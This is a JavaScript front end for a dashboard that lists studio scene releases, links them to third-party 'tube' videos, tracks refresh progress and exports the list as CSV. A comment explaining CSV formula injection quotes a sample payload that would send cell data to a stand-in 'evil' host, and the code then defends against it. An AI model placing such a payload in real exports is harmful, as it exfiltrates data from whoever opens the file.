import { renderSourceHealth, renderSourceHealthSummary } from "./source-health.js";

const $ = (selector) => document.querySelector(selector);
const list = $("#list");
const empty = $("#empty");
const emptyTitle = $("#empty-title");
const emptyMessage = $("#empty-message");
const search = $("#search");
const sort = $("#sort");
const studio = $("#studio");
const count = $("#count");
const notices = $("#notices");
const scenesTotal = $("#stat-scenes");
const linkedTotal = $("#stat-linked");
const linkRate = $("#link-rate");
const studiosTotal = $("#stat-studios");
const lastChecked = $("#last-checked");
const refreshState = $("#refresh-state");
const refreshButton = $("#refresh");
const sourcesList = $("#sources-list");
const sourceSummary = $("#source-summary");
const progressRow = $("#progress-row");
const overallTrack = $("#overall-track");
const overallSourcesHalf = $("#overall-half-sources");
const overallSourcesFill = $("#overall-fill-sources");
const overallLinksHalf = $("#overall-half-links");
const overallLinksFill = $("#overall-fill-links");
const overallNote = $("#overall-note");
const overallElapsed = $("#overall-elapsed");
const populateTrack = $("#populate-track");
const populateFill = $("#populate-fill");
const populateNote = $("#populate-note");
const linkTrack = $("#link-track");
const linkFill = $("#link-fill");
const linkNote = $("#link-note");
const linkDetail = $("#link-detail");
const progressLive = $("#progress-live");
let scenes = [];
let statuses = [];
let refreshing = false;
let catalogueLoaded = false;
let latestRun = null;

const esc = (value) => String(value ?? "").replace(/[&<>'"]/g, (character) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", "'": "&#39;", '"': "&quot;" })[character]);
const niceDate = (value) => {
  const date = new Date(`${value}T12:00:00Z`);
  return Number.isNaN(date.getTime()) ? "Date unknown" : date.toLocaleDateString("en", { day: "2-digit", month: "short", year: "numeric", timeZone: "UTC" });
};
const safeUrl = (value) => {
  try { const url = new URL(value); return url.protocol === "https:" ? url.href : ""; } catch { return ""; }
};
/** Live HTTPS links, deduplicated by normalized URL. Dead links live in a separate array. */
const linksFor = (scene) => {
  const items = Array.isArray(scene.videoUrls) ? scene.videoUrls : [];
  const seen = new Set();
  return items.filter((item) => {
    const url = safeUrl(item?.url);
    if (!item || !url || seen.has(url)) return false;
    seen.add(url);
    return true;
  });
};

/** Render the filtered, sorted catalogue grouped by release month. */
function render() {
  const query = search.value.trim().toLocaleLowerCase();
  const filtered = scenes.filter((scene) =>
    (studio.value === "all" || scene.labelId === studio.value) &&
    [scene.title, scene.label, ...(scene.performers || [])].join(" ").toLocaleLowerCase().includes(query));
  filtered.sort((a, b) => sort.value === "title"
    ? a.title.localeCompare(b.title)
    : (sort.value === "oldest" ? 1 : -1) * String(a.releaseDate || "").localeCompare(String(b.releaseDate || "")));
  count.textContent = `${filtered.length} ${filtered.length === 1 ? "release" : "releases"}`;
  renderEmptyState(filtered.length);
  list.hidden = filtered.length === 0;
  const groups = new Map();
  for (const scene of filtered) {
    const date = new Date(`${scene.releaseDate}T12:00:00Z`);
    const month = Number.isNaN(date.getTime()) ? "Undated" : date.toLocaleDateString("en", { month: "long", year: "numeric", timeZone: "UTC" });
    groups.set(month, [...(groups.get(month) || []), scene]);
  }
  list.innerHTML = [...groups].map(([month, items]) => `<section class="month-group"><div class="month-heading"><h3>${esc(month)}</h3><span>${items.length} RELEASE${items.length === 1 ? "" : "S"}</span></div>${items.map((scene) => {
    const initials = (scene.title || "L").split(/\s+/).slice(0, 2).map((word) => word[0]).join("").toUpperCase();
    const image = safeUrl(scene.thumbnailUrl);
    const thumb = image ? `<img src="${esc(image)}" loading="lazy" alt="">` : `<span class="thumb-initials">${esc(initials)}</span>`;
    const links = linksFor(scene);
    const sourceTotals = new Map();
    for (const item of links) sourceTotals.set(item.source, (sourceTotals.get(item.source) || 0) + 1);
    const sourceIndexes = new Map();
    const outbound = links.map((item) => {
      const index = (sourceIndexes.get(item.source) || 0) + 1;
      sourceIndexes.set(item.source, index);
      const label = sourceTotals.get(item.source) > 1 ? `${item.source} ${index}` : item.source;
      return `<a class="source-link source-link--${esc(item.source)}" href="${esc(safeUrl(item.url))}" target="_blank" rel="noopener noreferrer" title="Open on ${esc(item.source)}">${esc(label)} <span>↗</span></a>`;
    }).join("");
    const releaseUrl = safeUrl(scene.releaseUrl);
    const lowConfidence = scene.videoMatching && scene.videoMatching.confidence === "low";
    const flag = scene.metadataPoor ? '<span class="review-tag" title="Metadata-poor or low-confidence match; inspect before trusting">REVIEW</span>' : (lowConfidence ? '<span class="review-tag" title="No tube found a title that names this scene. This link was chosen from videos that matched its duration and upload window, using view count only; check it by hand.">LOW CONFIDENCE</span>' : "");
    return `<article class="release-row"><time class="release-date" datetime="${esc(scene.releaseDate)}"><strong>${esc(niceDate(scene.releaseDate).split(" ")[0])}</strong><span>${esc(niceDate(scene.releaseDate).split(" ").slice(1).join(" "))}</span></time><div class="release-thumb">${thumb}</div><div class="release-main"><div class="release-meta"><span class="studio-tag">${esc(scene.label)}</span>${flag}${scene.durationSec ? `<span>${Math.round(scene.durationSec / 60)} MIN</span>` : ""}</div><h4>${esc(scene.title)}</h4><p class="performers">${(scene.performers || []).length ? scene.performers.map(esc).join(" <i>·</i> ") : "Performer information unavailable"}</p></div><div class="release-links">${outbound || '<span class="unlinked">No verified link</span>'}${releaseUrl ? `<a class="release-page" href="${esc(releaseUrl)}" target="_blank" rel="noopener noreferrer">Release page ↗</a>` : ""}</div></article>`;
  }).join("")}</section>`).join("");
}

/** Explain an empty view using the catalogue snapshot and the live refresh state. */
function renderEmptyState(visibleCount = null) {
  // Progress polls only update the explanation; they never rebuild populated rows.
  if (scenes.length > 0 && visibleCount === null) return;
  empty.hidden = visibleCount > 0;
  if (empty.hidden) return;
  let title;
  let message;
  if (!catalogueLoaded) {
    title = "Loading catalogue…";
    message = "Waiting for the catalogue response.";
  } else if (scenes.length > 0) {
    title = "No releases found";
    message = "Try a different search or studio filter.";
  } else if (progressState.active || (refreshing && !catalogueReloadPending && !catalogueReloadFailed && progressState.stage !== "error")) {
    title = "Building the catalogue…";
    message = "The refresh is still running. This page updates when it finishes; reloading may show releases already collected. Follow its progress above.";
  } else if (catalogueReloadPending) {
    title = "Loading refreshed catalogue…";
    message = "The refresh has ended. Fetching its latest releases.";
  } else if (catalogueReloadFailed) {
    title = "Unable to load refreshed catalogue";
    message = "The catalogue request failed. This page will retry automatically, or you can reload.";
  } else if (progressState.stage === "error" || latestRun?.ok === false) {
    title = "Refresh failed to populate the catalogue";
    message = "No releases are available in this page’s catalogue. Check Sources for reported failures, then try Refresh now.";
  } else if (latestRun) {
    title = "No releases in the catalogue";
    message = "The refresh finished without releases in the current window. Check Sources or try Refresh now.";
  } else {
    title = "Waiting for the first refresh";
    message = "The catalogue has not been populated yet. Try Refresh now.";
  }
  emptyTitle.textContent = title;
  emptyMessage.textContent = message;
}

function renderSources() {
  sourceSummary.innerHTML = renderSourceHealthSummary(statuses);
  sourcesList.innerHTML = statuses.map((item) => {
    const authority = item.authority || {};
    const owned = scenes.filter((scene) => scene.sourceId === item.sourceId);
    const linked = owned.filter((scene) => linksFor(scene).length).length;
    const total = owned.length;
    const state = item.lastError ? (String(item.lastError).includes("not configured") ? "setup" : "error") : "ok";
    const url = safeUrl(authority.url);
    return `<article class="source-card source-card--${state}"><div class="source-card-top"><span class="status-pill"><i></i>${state === "ok" ? "HEALTHY" : state === "setup" ? "SETUP REQUIRED" : "NEEDS ATTENTION"}</span><span class="source-mark">${esc((authority.name || "S").slice(0, 1))}</span></div><p class="source-role">${esc(authority.role || "Catalogue source")}</p><h3>${esc(item.name)}</h3><p class="source-provider">via ${esc(authority.name || "configured source")}</p><div class="source-metrics"><span><strong>${total}</strong> releases</span><span><strong>${total ? Math.round(linked / total * 100) : 0}%</strong> linked</span></div><div class="source-health">${renderSourceHealth(item, scenes)}</div><div class="source-card-bottom"><span>Last good: ${item.lastSuccessAt ? esc(new Date(item.lastSuccessAt).toLocaleDateString()) : "—"}</span>${url ? `<a href="${esc(url)}" target="_blank" rel="noreferrer">Open source ↗</a>` : ""}</div></article>`;
  }).join("");
}

/** Apply a catalogue response to the scene list, source summary, and progress display. */
function apply(data) {
  scenes = Array.isArray(data.scenes) ? data.scenes : [];
  statuses = Array.isArray(data.sources) ? data.sources : [];
  refreshing = Boolean(data.refreshing);
  catalogueLoaded = true;
  latestRun = data.latestRun || null;
  catalogueReloadPending = false;
  catalogueReloadFailed = false;
  const stats = data.stats || {};
  scenesTotal.textContent = Number(stats.total ?? scenes.length).toLocaleString();
  linkedTotal.textContent = Number(stats.live ?? 0).toLocaleString();
  linkRate.textContent = `${stats.total ? Math.round((stats.live / stats.total) * 100) : 0}% of catalogue`;
  studiosTotal.textContent = statuses.length.toLocaleString();
  lastChecked.textContent = data.latestRun && data.latestRun.endedAt ? new Date(data.latestRun.endedAt).toLocaleString("en", { day: "numeric", month: "short", hour: "numeric", minute: "2-digit" }) : "—";
  refreshState.textContent = refreshing
    ? "Refresh in progress…"
    : data.latestRun
      ? (data.latestRun.ok
        ? (Number(data.latestRun.resolverHealth?.errored || 0) ? "Catalogue up to date · resolver unavailable" : "Catalogue up to date")
        : (Number(data.latestRun.resolverHealth?.errored || 0) ? "Source and resolver failures" : "Last refresh had source failures"))
      : "Waiting for first refresh";
  refreshButton.disabled = refreshing;
  const selected = studio.value;
  studio.replaceChildren(new Option("All studios", "all"));
  studio.insertAdjacentHTML("beforeend", statuses.map((item) => `<option value="${esc(item.labelId)}">${esc(item.label || item.name)} · ${scenes.filter((scene) => scene.labelId === item.labelId).length}</option>`).join(""));
  if ([...studio.options].some((option) => option.value === selected)) studio.value = selected;
  renderSources();
  render();
  // The read model carries a snapshot too, so a first paint that lands in the
  // middle of a cycle can already show its stage - the poll takes it from there.
  applyProgress(data.progress);
}

async function load() {
  const response = await fetch("/api/scenes", { cache: "no-store" });
  if (!response.ok) throw new Error(`Server returned ${response.status}`);
  apply(await response.json());
}

/* ---- Live refresh progress -------------------------------------------------
   A cycle takes minutes and used to say nothing at all until it ended, so a
   long run and a hung one looked identical. `/api/progress` is polled on its
   own: a few hundred bytes, separate from the ~137 KB catalogue fetch, because
   refetching the catalogue every couple of seconds to move a bar would re-sort
   the list under the reader's cursor.

   The row is REVEALED LATE, ~1.2 s in. A cycle that finishes first never
   flashes a bar at all, and a bar that appears instantly alongside a click
   reads as a loading decoration rather than as information about a job. */
const POLL_ACTIVE_MS = 2000;
const POLL_IDLE_MS = 20000;
const REVEAL_DELAY_MS = 1200;
const LIVE_SOURCE_NAMES = 2;

let progressState = { active: false, stage: "idle" };
let pollTimer = null;
let pollPending = false;
let catalogueReloadFailed = false;
let catalogueReloadPending = false;
let revealTimer = null;
let elapsedTimer = null;
let rowShown = false;
let primed = false;
let announcedRun = null;

/** Coerce a progress value to a finite number, using zero when conversion fails. */
const num = (value) => (Number.isFinite(Number(value)) ? Number(value) : 0);

/** Fill for one stage as a whole percent, or null when there is nothing to count. */
const ratio = (done, total) => (num(total) > 0 ? Math.max(0, Math.min(100, Math.round((num(done) / num(total)) * 100))) : null);

/** `48s`, `4m 12s`. Ticked locally from `startedAt`, so a stalled counter is still visibly alive. */
const elapsedText = (startedAt) => {
  const started = Date.parse(startedAt || "");
  if (!Number.isFinite(started)) return "";
  const seconds = Math.max(0, Math.round((Date.now() - started) / 1000));
  return seconds < 60 ? `${seconds}s` : `${Math.floor(seconds / 60)}m ${String(seconds % 60).padStart(2, "0")}s`;
};

/**
 * The stage, in plain English. The names here are adapter ids from the static
 * registry, never scraped page text - and they are written with `textContent`
 * below, so they are never parsed as markup either way.
 */
function stageCaption(progress) {
  const index = progress.index || {};
  const populate = progress.populate || {};
  const link = progress.link || {};
  if (progress.stage === "indexing") return `Indexing the trusted pool — ${num(index.done)} of ${num(index.total)} accounts`;
  if (progress.stage === "populating") {
    const inFlight = Array.isArray(populate.current) ? populate.current : [];
    const names = inFlight.slice(0, LIVE_SOURCE_NAMES);
    if (!names.length) return `Polling sources — ${num(populate.done)} of ${num(populate.total)} done`;
    return `Polling sources — ${names.join(", ")}${inFlight.length > names.length ? "…" : ""}`;
  }
  if (progress.stage === "linking") {
    return num(link.total) > 0
      ? `Checking ${num(link.total)} releases for a verified link — ${num(link.done)} done, ${num(link.matched)} linked`
      : "Nothing to check for a link";
  }
  if (progress.stage === "verifying") {
    return num(link.verifyTotal) > 0
      ? `Re-checking ${num(link.verifyTotal)} existing links — ${num(link.verifyDone)} done`
      : "Nothing to re-check";
  }
  if (progress.stage === "finishing") return "Finishing up";
  if (progress.stage === "error") return "Refresh failed — see the Sources section";
  return "Working…";
}

/** `null` percent means "indeterminate": the track shimmers instead of sitting at a permanent 0%. */
function setTrack(half, fill, percent) {
  fill.style.width = percent === null ? "0%" : `${percent}%`;
  if (half) half.classList.toggle("is-indeterminate", percent === null);
}

/** An indeterminate progressbar must not carry `aria-valuenow`; the text carries the meaning instead. */
function setAria(track, percent, text) {
  if (percent === null) track.removeAttribute("aria-valuenow");
  else track.setAttribute("aria-valuenow", String(percent));
  track.setAttribute("aria-valuetext", text);
}

/** Update stage meters, captions, and accessibility values from a progress snapshot. */
function renderProgress(progress) {
  const populate = progress.populate || {};
  const link = progress.link || {};
  const verifying = link.substage === "verify";
  const sources = ratio(populate.done, populate.total);
  // While re-verifying, the Linking bar tracks the re-verify slice rather than
  // the resolve queue - the queue is already complete and would sit at 100%.
  const links = verifying ? ratio(link.verifyDone, link.verifyTotal) : ratio(link.done, link.total);
  const caption = stageCaption(progress);

  overallNote.textContent = caption;
  setTrack(overallSourcesHalf, overallSourcesFill, sources);
  setTrack(overallLinksHalf, overallLinksFill, links);
  // Never shown as a number: six crawls and 121 link checks are not one unit
  // of work, so there is no honest single figure. The average exists only to
  // give the progressbar role a valid value when both stages are known;
  // otherwise use the known stage, or leave the value indeterminate.
  const overall = sources === null ? links : links === null ? sources : Math.round((sources + links) / 2);
  setAria(overallTrack, overall, caption);

  populateNote.textContent = num(populate.total) > 0 ? `${num(populate.done)} of ${num(populate.total)} sources` : "No sources configured";
  setTrack(populateTrack, populateFill, sources);
  setAria(populateTrack, sources, populateNote.textContent);

  linkNote.textContent = verifying
    ? (num(link.verifyTotal) > 0 ? `${num(link.verifyDone)} of ${num(link.verifyTotal)} re-checked` : "Nothing to re-check")
    : (num(link.total) > 0 ? `${num(link.done)} of ${num(link.total)} checked` : "Nothing to check");
  linkDetail.textContent = num(link.total) > 0 ? `${num(link.matched)} linked` : "";
  setTrack(linkTrack, linkFill, links);
  setAria(linkTrack, links, linkNote.textContent);
}

/** Reveal the progress row once, starting its fade after the initial layout. */
function showRow() {
  if (rowShown) return;
  rowShown = true;
  progressRow.hidden = false;
  // Two frames: the row has to be laid out at zero opacity before it is allowed
  // to fade in, or the transition has nothing to interpolate from.
  progressRow.style.opacity = "0";
  requestAnimationFrame(() => { progressRow.style.opacity = ""; });
}

/** Cancel reveal and elapsed timers, clear elapsed text, and hide the progress row. */
function hideRow() {
  if (revealTimer) { clearTimeout(revealTimer); revealTimer = null; }
  if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
  overallElapsed.textContent = "";
  if (!rowShown) return;
  rowShown = false;
  progressRow.hidden = true;
  progressRow.style.opacity = "";
}

/** Refresh elapsed time from the active run, or clear it when the run is inactive. */
function tickElapsed() {
  overallElapsed.textContent = progressState.active ? elapsedText(progressState.startedAt) : "";
}

/** Update the refresh button state and show the in-progress caption for an active run. */
function syncRefreshChrome(active) {
  refreshButton.disabled = active;
  refreshButton.classList.toggle("is-loading", active);
  if (active) refreshState.textContent = "Refresh in progress…";
}

/** Absorb one snapshot. Returns whether a cycle is live, which sets the next poll delay. */
function applyProgress(next) {
  const wasActive = Boolean(progressState.active);
  const previousRun = progressState.runId || null;
  progressState = next && typeof next === "object" ? next : { active: false, stage: "idle" };
  const active = Boolean(progressState.active);
  const run = progressState.runId || null;
  const newRun = primed && run !== null && run !== previousRun;

  // The live region carries exactly two messages per run. The first snapshot of
  // a page load is not one of them: a cycle already in flight was started by the
  // boot sync, the timer or somebody else, and announcing it would announce
  // something this reader did not do.
  if (!primed) {
    primed = true;
    announcedRun = run;
  } else if (active && run && announcedRun !== run) {
    announcedRun = run;
    progressLive.textContent = "Refresh started";
  }

  if (active) {
    if (!rowShown && !revealTimer) {
      revealTimer = setTimeout(() => {
        revealTimer = null;
        // Rendered HERE, not left to the next poll: the row appears empty for a
        // whole interval otherwise, which reads as a broken bar rather than a
        // deliberate delay.
        if (progressState.active) { showRow(); renderProgress(progressState); }
      }, REVEAL_DELAY_MS);
    }
    if (rowShown) renderProgress(progressState);
    tickElapsed();
    if (!elapsedTimer) elapsedTimer = setInterval(tickElapsed, 1000);
  } else {
    hideRow();
    // A run can finish between polls or while the tab is hidden. Reload on
    // completion or a newly observed run, without refetching every idle poll.
    if (wasActive) {
      progressLive.textContent = progressState.stage === "error" ? "Refresh failed" : "Refresh finished";
    }
    if (wasActive || newRun) {
      catalogueReloadPending = true;
      load().catch(() => {
        catalogueReloadPending = false;
        catalogueReloadFailed = true;
        renderEmptyState();
      });
    }
  }
  syncRefreshChrome(active);
  renderEmptyState();
  return active;
}

/** Replace the pending progress poll with a delayed one while the tab is visible. */
function schedulePoll(delay) {
  if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
  if (document.hidden) return;
  pollTimer = setTimeout(pollProgress, delay);
}

/** Fetch progress with at most one request in flight, then schedule the next poll. */
async function pollProgress() {
  if (pollTimer) clearTimeout(pollTimer);
  pollTimer = null;
  // One request in flight, ever. Chained with `setTimeout` rather than
  // `setInterval` so a slow response cannot stack up behind itself.
  if (document.hidden || pollPending) return;
  pollPending = true;
  let active = Boolean(progressState.active);
  try {
    const response = await fetch("/api/progress", { cache: "no-store" });
    if (!response.ok) throw new Error(String(response.status));
    const body = await response.json();
    active = applyProgress(body.progress);
    if (!active && catalogueReloadFailed) {
      await load();
      catalogueReloadFailed = false;
    }
  } catch {
    // A failed poll leaves the last snapshot alone - collapsing a bar because
    // one request failed would be a lie - and backs the loop off to idle.
  } finally {
    pollPending = false;
  }
  schedulePoll(active ? POLL_ACTIVE_MS : POLL_IDLE_MS);
}

// A hidden tab asks for nothing at all. Coming back asks immediately rather
// than resuming mid-interval, so the meters are not up to 20 s stale on return.
document.addEventListener("visibilitychange", () => {
  if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
  if (!document.hidden) pollProgress();
});

search.addEventListener("input", render);
sort.addEventListener("change", render);
studio.addEventListener("change", render);
refreshButton.addEventListener("click", async () => {
  refreshButton.disabled = true;
  refreshButton.classList.add("is-loading");
  refreshState.textContent = "Refresh requested…";
  try { await fetch("/api/refresh", { method: "POST" }); } catch { /* the poll below reports state */ }
  pollProgress();
});
// Every exported cell is REMOTE TEXT: titles, performer names and labels come
// from scraped studio pages, and a title is attacker-influenced in the same way
// any user-supplied string is. Quoting alone does not make a CSV safe - Excel,
// LibreOffice and Google Sheets all evaluate a quoted cell that STARTS with
// `=`, `+`, `-` or `@` as a formula, so `=HYPERLINK("http://evil/"&A1,"click")`
// in a title becomes live code in whoever opens the export. The leading
// apostrophe is the documented escape: it forces text and is not displayed.
const FORMULA_LEAD = /^[=+\-@\t\r]/;
function csvCell(value) {
  const text = String(value ?? "");
  return `"${(FORMULA_LEAD.test(text) ? `'${text}` : text).replaceAll('"', '""')}"`;
}
$("#export").addEventListener("click", () => {
  const headings = ["studio", "title", "release_date", "performers", "release_url", "video_sources"];
  const rows = scenes.map((scene) => [scene.label, scene.title, scene.releaseDate, (scene.performers || []).join("; "), scene.releaseUrl, linksFor(scene).map((item) => item.url).join("; ")]);
  const csv = [headings, ...rows].map((row) => row.map(csvCell).join(",")).join("\r\n");
  const anchor = document.createElement("a");
  anchor.href = URL.createObjectURL(new Blob([csv], { type: "text/csv" }));
  anchor.download = "liszt-catalogue.csv";
  anchor.click();
  URL.revokeObjectURL(anchor.href);
});
document.querySelectorAll("[data-nav]").forEach((link) => link.addEventListener("click", () => {
  document.querySelectorAll("[data-nav]").forEach((item) => item.classList.toggle("active", item === link));
}));
document.addEventListener("keydown", (event) => {
  if ((event.metaKey || event.ctrlKey) && event.key.toLowerCase() === "k") { event.preventDefault(); search.focus(); }
});
try {
  await load();
} catch (error) {
  notices.innerHTML = `<div class="notice notice-warning">Catalogue unavailable: ${esc(error.message)}</div>`;
  refreshState.textContent = "Unable to load catalogue";
} finally {
  schedulePoll(refreshing ? POLL_ACTIVE_MS : POLL_IDLE_MS);
}
